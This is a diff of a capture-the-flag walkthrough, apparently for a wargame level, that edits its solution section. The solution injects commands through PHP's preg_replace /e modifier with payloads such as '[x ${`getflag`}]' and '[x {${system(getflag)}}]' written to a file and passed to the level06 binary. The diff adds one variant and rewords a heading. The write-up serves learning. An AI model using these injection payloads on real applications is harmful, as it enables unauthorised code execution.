@@ -99,14 +99,16 @@ Solution
 # [x ${`getflag`}] - framed in this form
 # echo $(oneliner) > /tmp/temp - push it to a FILE
 
+> echo "[x $(getflag)]" > /tmp/temp
+    OR
 > echo '[x ${`getflag`}]' > /tmp/temp
-   OR
+    OR
 > echo '[x {${system(getflag)}}]' > /tmp/tmp
-   THEN
+    THEN
 > ./level06 /tmp/temp
 ```
 
-In reverse:
+Reverse logic:
 
 - `y($m)` gets called via `/e`
 - if `$m` is `getflag`, `y($m)` will return the flag w. substitution
